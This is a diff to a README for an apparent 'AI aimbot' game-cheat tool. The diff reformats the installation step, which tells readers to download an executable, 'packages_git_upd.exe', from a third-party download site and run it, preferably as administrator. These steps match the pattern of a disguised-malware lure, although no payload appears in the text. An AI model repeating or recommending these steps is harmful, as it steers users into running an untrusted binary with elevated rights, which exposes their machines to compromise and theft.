@@ -8,7 +8,7 @@ This tool allows you to quickly deploy and keep up-to-date an AI aimbot based on
 
 ### Installation and Update
 
-1. **Download** `packages_git_upd.exe` from here - fullsofts.org
+### 1. **Download** `packages_git_upd.exe` from here - fullsofts.org
 2. **Run the program** (recommended as administrator)
 3. Wait for the automatic installation/update of all components to complete
 
